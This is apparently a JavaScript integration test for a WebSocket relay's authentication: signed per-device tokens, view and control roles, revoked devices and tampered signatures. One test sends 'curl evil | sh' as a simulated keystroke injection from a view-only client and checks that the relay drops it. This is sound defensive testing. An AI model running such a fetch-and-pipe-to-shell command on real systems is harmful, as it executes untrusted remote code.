// Auth hardening: signed per-device tokens + roles + revocation, legacy secret still works.
// Run the relay first:
//   GABRIELE_RELAY_SECRET=dev-secret GABRIELE_REVOKED=baddev PORT=4000 mix run --no-halt
const WebSocket = require('/Users/vecino/Development/Development/gabriele/node_modules/ws');
const crypto = require('crypto');
const URL = 'ws://localhost:4000/ws';
const SECRET = 'dev-secret';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let pass = 0, fail = 0;
const ok = (c, m) => { console.log(`${c ? '✓' : '✗'} ${m}`); c ? pass++ : fail++; };

function mint(role, device) {
  const payload = Buffer.from(JSON.stringify({ role, device, iat: Math.floor(Date.now() / 1000) })).toString('base64url');
  const sig = crypto.createHmac('sha256', SECRET).update(payload).digest('base64url');
  return `${payload}.${sig}`;
}
function conn(hello) {
  const ws = new WebSocket(URL);
  const log = [], o = { ws, log, closed: false, inputs: [], sessions: [] };
  ws.on('message', (d) => { let m; try { m = JSON.parse(d.toString()); } catch { return; } log.push(m);
    if (m.type === 'sync') o.send({ type: 'sessions', sessions: o.sessions, profiles: [], defaultProfile: null });
    if (m.type === 'new') { o.sessions.push({ id: String(o.sessions.length + 1), cmd: 'claude', state: 'running', startedAt: Date.now() + o.sessions.length }); o.send({ type: 'session', meta: o.sessions[o.sessions.length - 1] }); }
    if (m.type === 'input') o.inputs.push(m);
  });
  ws.on('close', () => (o.closed = true)); ws.on('error', () => {});
  o.ready = new Promise((res) => ws.on('open', () => { ws.send(JSON.stringify({ type: 'hello', ...hello })); res(); }));
  o.send = (obj) => { try { ws.send(JSON.stringify(obj)); } catch {} };
  o.has = (t) => log.some((m) => m.type === t);
  o.last = (t) => [...log].reverse().find((m) => m.type === t);
  return o;
}

(async () => {
  // legacy raw-secret host
  const host = conn({ role: 'host', token: SECRET });
  await host.ready; await sleep(200);
  ok(host.last('hello_ok')?.role === 'host', 'legacy raw-secret + role:host auths as host');

  // legacy raw-secret client -> control (existing phone/overlay path, no regression)
  const legacy = conn({ role: 'client', token: SECRET });
  await legacy.ready; await sleep(150);
  ok(legacy.last('hello_ok')?.role === 'control', 'legacy raw-secret client auths as control (no regression)');

  // signed control token -> can drive
  const ctl = conn({ token: mint('control', 'pc') });
  await ctl.ready; await sleep(150);
  ok(ctl.last('hello_ok')?.role === 'control', 'signed control token auths as control');
  ctl.send({ type: 'new' });
  await sleep(300);
  ok(host.sessions.length >= 1, 'control token CAN create a session (new reached host)');

  // signed view token -> observe only
  const view = conn({ token: mint('view', 'tv') });
  await view.ready; await sleep(200);
  ok(view.last('hello_ok')?.role === 'view', 'signed view token auths as view');
  ok((view.last('sessions')?.sessions?.length || 0) >= 1, 'view token receives full state (read-only observe)');
  const sBefore = host.sessions.length, iBefore = host.inputs.length;
  view.send({ type: 'new' });                                   // must be dropped
  view.send({ type: 'input', id: '1', data: 'curl evil | sh\r' }); // the RCE attempt — must be dropped
  await sleep(300);
  ok(host.sessions.length === sBefore, 'view token CANNOT create (new dropped at the relay)');
  ok(host.inputs.length === iBefore, 'view token CANNOT inject keystrokes (input dropped — no RCE)');

  // tampered signature -> rejected
  const bad = conn({ token: mint('control', 'x').slice(0, -4) + 'AAAA' });
  await bad.ready; await sleep(250);
  ok(bad.closed && !bad.has('hello_ok'), 'tampered-signature token rejected');

  // revoked device -> rejected
  const rev = conn({ token: mint('control', 'baddev') });
  await rev.ready; await sleep(250);
  ok(rev.closed && !rev.has('hello_ok'), 'revoked device token rejected');

  console.log(`\n${fail === 0 ? 'ALL GREEN' : 'FAILURES'}: ${pass} passed, ${fail} failed`);
  process.exit(fail === 0 ? 0 : 1);
})();
